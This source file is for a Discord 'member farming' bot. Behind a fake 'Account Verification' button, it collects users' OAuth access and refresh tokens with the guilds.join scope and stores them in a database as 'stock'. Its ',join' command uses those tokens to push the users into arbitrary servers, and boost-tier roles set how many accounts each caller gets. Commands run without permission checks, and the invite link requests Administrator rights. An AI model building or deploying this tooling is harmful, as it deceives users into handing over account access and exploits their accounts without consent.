const { 
    Client, 
    GatewayIntentBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionsBitField,
    REST,
    Routes,
    SlashCommandBuilder,
    WebhookClient,
    MessageType
} = require('discord.js');
const express = require('express');
const mongoose = require('mongoose');
const https = require('https');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

const DEFAULT_PREFIX = ','; 
let currentPrefix = DEFAULT_PREFIX;

let lastBoostStickyMessage = null; 

const CHANNELS = {
    AUTORESTOCK: '1563253480553054358',       
    FARM_LOG: '1563253450693808210',          
    VERIFICATION_LOG: '1563253454653235261',  
    AUTO_DELETE: '1563253483824746659'        
};

// --- MongoDB Persistent Schema ---
if (process.env.MONGO_URI) {
    mongoose.connect(process.env.MONGO_URI)
        .then(() => console.log('Connected to MongoDB Database'))
        .catch(err => console.error('MongoDB error:', err));
}

const userSchema = new mongoose.Schema({
    user_id: { type: String, unique: true },
    username: String,
    avatar: String,
    banner: String,
    access_token: String,
    refresh_token: String,
    authorized_at: Number,
    expires_at: Number
});
const UserModel = mongoose.model('User', userSchema);

const statsSchema = new mongoose.Schema({
    key: { type: String, unique: true },
    restockCounter: { type: Number, default: 0 },
    allTimeAuthCount: { type: Number, default: 0 }
});
const StatsModel = mongoose.model('Stat', statsSchema);

async function getStats() {
    let stats = await StatsModel.findOne({ key: 'global' });
    if (!stats) {
        stats = await StatsModel.create({ key: 'global', restockCounter: 0, allTimeAuthCount: 0 });
    }
    return stats;
}

// Helper HTTPS POST Function (no fetch module needed)
function postHttps(url, bodyString, headers = {}) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const req = https.request({
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'POST',
            headers: {
                ...headers,
                'Content-Length': Buffer.byteLength(bodyString)
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
                catch (e) { resolve({ status: res.statusCode, data }); }
            });
        });
        req.on('error', reject);
        req.write(bodyString);
        req.end();
    });
}

function getHttps(url, headers = {}) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const req = https.request({
            hostname: parsedUrl.hostname,
            path: parsedUrl.pathname + parsedUrl.search,
            method: 'GET',
            headers
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try { resolve({ status: res.statusCode, data: JSON.parse(data) }); }
                catch (e) { resolve({ status: res.statusCode, data }); }
            });
        });
        req.on('error', reject);
        req.end();
    });
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

// --- OAuth Receiver Endpoint ---
app.get('/', async (req, res) => {
    const code = req.query.code;
    const error = req.query.error;

    if (error) return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Cancelled</h1></body></html>`);
    if (!code) return res.send(`<html><body style="background:#111;color:#fff;text-align:center;padding-top:50px;"><h1>Flex Farmer Server Active</h1></body></html>`);

    try {
        const params = new URLSearchParams({
            client_id: process.env.CLIENT_ID || '1561438987464483048',
            client_secret: process.env.CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app',
        }).toString();

        const tokenRes = await postHttps('https://discord.com/api/oauth2/token', params, {
            'Content-Type': 'application/x-www-form-urlencoded'
        });

        if (tokenRes.data && tokenRes.data.access_token) {
            const oauthData = tokenRes.data;
            const userRes = await getHttps('https://discord.com/api/users/@me', {
                'Authorization': `Bearer ${oauthData.access_token}`
            });
            const userData = userRes.data;

            if (userData && userData.id) {
                await UserModel.findOneAndUpdate(
                    { user_id: userData.id },
                    {
                        username: userData.username,
                        avatar: userData.avatar,
                        banner: userData.banner,
                        access_token: oauthData.access_token,
                        refresh_token: oauthData.refresh_token,
                        authorized_at: Date.now(),
                        expires_at: Date.now() + (oauthData.expires_in * 1000)
                    },
                    { upsert: true, new: true }
                );

                let stats = await getStats();
                stats.restockCounter += 1;
                stats.allTimeAuthCount += 1;
                await stats.save();

                const totalStock = await UserModel.countDocuments();

                if (client.isReady()) {
                    try {
                        let verifChannel = client.channels.cache.get(CHANNELS.VERIFICATION_LOG) || await client.channels.fetch(CHANNELS.VERIFICATION_LOG);
                        if (verifChannel) {
                            const embed = new EmbedBuilder()
                                .setTitle('⚡ New User Verified')
                                .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified!\n\n**Total Stock:** \`${totalStock}\``)
                                .setColor(0x00FF00)
                                .setTimestamp();
                            await verifChannel.send({ embeds: [embed] });
                        }
                    } catch (e) {}
                }

                return res.send(`<html><body style="background:#111;color:#55ff55;text-align:center;padding-top:50px;"><h1>Verified Successfully!</h1><p>You can close this tab.</p></body></html>`);
            }
        }
        return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Verification Failed</h1></body></html>`);
    } catch (err) {
        return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Server Error</h1></body></html>`);
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`Web server active on port ${PORT}`));

async function sendRestockAnnouncement(channel, amountAdded) {
    try {
        const totalStock = await UserModel.countDocuments();
        const msg = 
            `**Restock Alert!**\n\n` +
            `**Flex Network** has restocked with **${amountAdded}**!\n\n` +
            `> Current Stock: **${totalStock}**\n\n` +
            `> **Want more per command?**\n` +
            `-# <#1563253471145361572> / <#1563253473238065326>\n\n` +
            `> **Quick Head To Channel!**\n` +
            `-# <#1563253483824746659> / <#1563253479059886223>\n\n` +
            `@everyone`;

        const sent = await channel.send({ content: msg });
        await sent.react('☑️');
    } catch (e) {}
}

const slashCommands = [
    new SlashCommandBuilder()
        .setName('say')
        .setDescription('Send custom message')
        .addStringOption(opt => opt.setName('message').setDescription('Content').setRequired(true))
        .addBooleanOption(opt => opt.setName('embed').setDescription('Embed mode').setRequired(false))
        .addStringOption(opt => opt.setName('webhook_url').setDescription('Webhook URL').setRequired(false))
].map(c => c.toJSON());

client.once('ready', async () => {
    console.log(`Flex Farmer ready as ${client.user.tag}`);
    const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
    try {
        await rest.put(Routes.applicationCommands(process.env.CLIENT_ID || '1561438987464483048'), { body: slashCommands });
    } catch (e) {}
});

client.on('interactionCreate', async interaction => {
    if (interaction.isButton()) {
        if (interaction.customId === 'restock_yes') {
            await interaction.update({ content: '✅ Restock announcement confirmed!', components: [] });
            const restockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
            if (restockChannel) {
                const stats = await getStats();
                await sendRestockAnnouncement(restockChannel, stats.restockCounter);
            }
            return;
        } else if (interaction.customId === 'restock_no') {
            return interaction.update({ content: '❌ Restock announcement cancelled.', components: [] });
        }
    }

    if (!interaction.isChatInputCommand()) return;
    if (interaction.commandName === 'say') {
        const text = interaction.options.getString('message');
        const isEmbed = interaction.options.getBoolean('embed') || false;
        const webhookUrl = interaction.options.getString('webhook_url');

        try {
            if (webhookUrl) {
                const whClient = new WebhookClient({ url: webhookUrl });
                if (isEmbed) await whClient.send({ embeds: [new EmbedBuilder().setDescription(text).setColor(0x5865F2)] });
                else await whClient.send({ content: text });
                return interaction.reply({ content: '✅ Sent via Webhook!', ephemeral: true });
            }
            if (isEmbed) await interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(text).setColor(0x5865F2)] });
            else await interaction.channel.send({ content: text });
            return interaction.reply({ content: '✅ Sent!', ephemeral: true });
        } catch (err) {
            return interaction.reply({ content: `❌ Failed: ${err.message}`, ephemeral: true });
        }
    }
});

async function sendBoostStickyPanel(channel) {
    const boostContent = 
        `⟡ **𝗙𝗟𝗘𝗫 | 𝗕𝗢𝗢𝗦𝗧 𝗥𝗘𝗪𝗔𝗥𝗗𝗦**\n\n` +
        `⌁ **𝗕𝗢𝗢𝗦𝗧 𝗧𝗛𝗘 𝗦𝗘𝗥𝗩𝗘𝗥. 𝗘𝗔𝗥𝗡 𝗥𝗔𝗡𝗞𝗦.**\n\n` +
        `💚 **2 Boost** = <@&1563467675236311100>\n\n` +
        `💎 **4 Boosts** = <@&1563467259194908722>\n\n\n` +
        `・**You only get rank for 2-3 weeks**\n` +
        `・**Ranks arent automatically given.**\n` +
        `・**Open a ticket in <#1563253473238065326> to claim your rank.**`;

    const stickyEmbed = new EmbedBuilder().setDescription(boostContent).setColor(0x595B5C); 
    if (lastBoostStickyMessage) {
        try { await lastBoostStickyMessage.delete(); } catch (e) {}
    }
    lastBoostStickyMessage = await channel.send({ embeds: [stickyEmbed] });
}

client.on('messageCreate', async message => {
    const rawContent = message.content.trim();

    if ([MessageType.GuildBoost, MessageType.GuildBoostTier1, MessageType.GuildBoostTier2, MessageType.GuildBoostTier3].includes(message.type)) {
        await sendBoostStickyPanel(message.channel);
        return;
    }

    if (message.channel.id === CHANNELS.AUTO_DELETE) {
        setTimeout(async () => {
            try { if (message.deletable) await message.delete(); } catch (err) {}
        }, 7000);
    }

    if (message.author.bot) return;

    if (rawContent.toLowerCase() === ',rbot' || rawContent.toLowerCase() === '.rbot') {
        const embed = new EmbedBuilder().setDescription('Use the bot, click the button below.').setColor(0x595B5C);
        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('use {r-bot}').setStyle(ButtonStyle.Link).setURL('https://discord.gg/ZK3Er7Xgdq')
        );
        await message.channel.send({ embeds: [embed], components: [row] });
        try { if (message.deletable) await message.delete(); } catch(e){}
        return;
    }

    if (!rawContent.startsWith(currentPrefix)) return;

    const args = rawContent.slice(currentPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'stickboost') {
        await sendBoostStickyPanel(message.channel);
        try { if (message.deletable) await message.delete(); } catch(e){}
        return;
    }

    if (command === 'verify' || command === 'link') {
        const clientId = process.env.CLIENT_ID || '1561438987464483048';
        const redirectUri = process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app';
        const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify+guilds.join`;

        const embed = new EmbedBuilder()
            .setTitle('Account Verification')
            .setDescription('Click the button below to authorize with Flex Farmer.')
            .setColor(0x00FF00);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setLabel('-> Verify').setStyle(ButtonStyle.Link).setURL(oauthUrl)
        );

        return message.channel.send({ embeds: [embed], components: [row] });
    }

    if (command === 'help') {
        const helpEmbed = new EmbedBuilder()
            .setTitle('Member Farm — Command Panel')
            .setDescription(`Current prefix: \`${currentPrefix}\` — change with \`${currentPrefix}prefix set <prefix>\``)
            .setColor(0x5865F2)
            .addFields(
                { 
                    name: 'Core & Verification', 
                    value: `\`${currentPrefix}verify\` - Generates OAuth2 verify button\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}auth\` - Displays authorization stats\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                },
                { 
                    name: 'Config & Management', 
                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles auto-restocks\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                },
                { 
                    name: 'Admin & Control', 
                    value: `\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
                }
            )
            .setFooter({ text: 'Member Farm Utility' });

        return message.channel.send({ embeds: [helpEmbed] });
    }

    if (command === 'bot' || command === 'invite') {
        const inviteUrl = 'https://discord.com/api/oauth2/authorize?client_id=1561438987464483048&permissions=8&scope=bot+applications.commands';
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(inviteUrl));
        return message.channel.send({ components: [row] });
    }

    if (command === 'stock') {
        const totalStock = await UserModel.countDocuments();
        const stats = await getStats();
        const lastRestockCount = Math.min(stats.restockCounter, totalStock);
        return message.channel.send({ embeds: [new EmbedBuilder().setTitle('📦 Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(0x595B5C)] });
    }

    if (command === 'auth' || command === 'authed') {
        const users = await UserModel.find({});
        const now = Date.now();
        const last24hCount = users.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;
        const stats = await getStats();

        const authEmbed = new EmbedBuilder()
            .setTitle('⚡ Authorization & Stock Statistics')
            .setColor(0x5865F2)
            .addFields(
                { name: '🕒 Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
                { name: '🌐 All-Time', value: `\`${stats.allTimeAuthCount}\` total authorizations`, inline: true },
                { name: '📦 Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
            );
        return message.channel.send({ embeds: [authEmbed] });
    }

    if (command === 'status') {
        const totalStock = await UserModel.countDocuments();
        const uptimeSeconds = Math.floor(client.uptime / 1000);
        const hours = Math.floor(uptimeSeconds / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        const seconds = uptimeSeconds % 60;
        const statusEmbed = new EmbedBuilder()
            .setTitle('🟢 Flex Farmer Status')
            .setColor(0x00FF00)
            .addFields(
                { name: '📊 Active Verified Stock', value: `\`${totalStock}\` accounts`, inline: true },
                { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
            );
        return message.channel.send({ embeds: [statusEmbed] });
    }

    if (command === 'restock') {
        const totalStock = await UserModel.countDocuments();
        const amount = parseInt(args[0]) || totalStock;
        let stats = await getStats();
        stats.restockCounter = amount;
        stats.allTimeAuthCount += amount;
        await stats.save();

        const promptEmbed = new EmbedBuilder()
            .setTitle('📦 Restock Stock Prepared')
            .setDescription(`Successfully stocked **${amount}** authorized users!\n\n**Do you want to send an announcement message in the restock channel (<#${CHANNELS.AUTORESTOCK}>)?**`)
            .setColor(0x5865F2);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('restock_yes').setLabel('Yes').setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId('restock_no').setLabel('No').setStyle(ButtonStyle.Danger)
        );

        return message.channel.send({ embeds: [promptEmbed], components: [row] });
    }

    if (command === 'remove') {
        const amount = parseInt(args[0]) || 1;
        const users = await UserModel.find({}).limit(amount);
        for (const user of users) {
            await UserModel.deleteOne({ _id: user._id });
        }
        const remainingStock = await UserModel.countDocuments();
        return message.channel.send(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
    }

    if (command === 'join') {
        const targetGuildId = args[0];
        if (!targetGuildId) return message.channel.send(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);

        let tokensToUse = await UserModel.find({});
        if (tokensToUse.length === 0) {
            return message.channel.send({ embeds: [new EmbedBuilder().setTitle('❌ Out of Stock').setDescription(`No accounts available.`).setColor(0xFF0000)] });
        }

        const roleLimits = [
            { id: '1563467132107231253', limit: 2 },   
            { id: '1563467152202137681', limit: 4 },   
            { id: '1563467218212356118', limit: 6 },   
            { id: '1563467378040504431', limit: 8 },   
            { id: '1563467675236311100', limit: 10 },  
            { id: '1563467259194908722', limit: 20 }   
        ];

        let allowedLimit = Infinity;
        for (const tier of roleLimits) {
            if (message.member.roles.cache.has(tier.id)) {
                allowedLimit = tier.limit;
                break;
            }
        }

        if (allowedLimit !== Infinity) {
            const limit = Math.min(allowedLimit, tokensToUse.length);
            tokensToUse = tokensToUse.slice(0, limit);
            message.channel.send(`⚠️ Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
        }

        await message.channel.send(`Flex Farmer attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);

        let successCount = 0;
        for (const tokenData of tokensToUse) {
            try {
                const joinRes = await postHttps(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, JSON.stringify({ access_token: tokenData.access_token }), {
                    'Authorization': `Bot ${process.env.DISCORD_TOKEN}`,
                    'Content-Type': 'application/json'
                });

                if (joinRes.status >= 200 && joinRes.status < 300) {
                    successCount++;
                }
            } catch (err) {}
        }

        try {
            let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
            if (farmLogChannel) {
                const farmEmbed = new EmbedBuilder()
                    .setTitle('📊 Farm Execution Log')
                    .setDescription(`**User:** <@${message.author.id}>\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
                    .setColor(0x5865F2)
                    .setTimestamp();
                await farmLogChannel.send({ embeds: [farmEmbed] });
            }
        } catch (e) {}

        return message.channel.send(`Flex Farmer successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
    }
});

client.login(process.env.DISCORD_TOKEN);
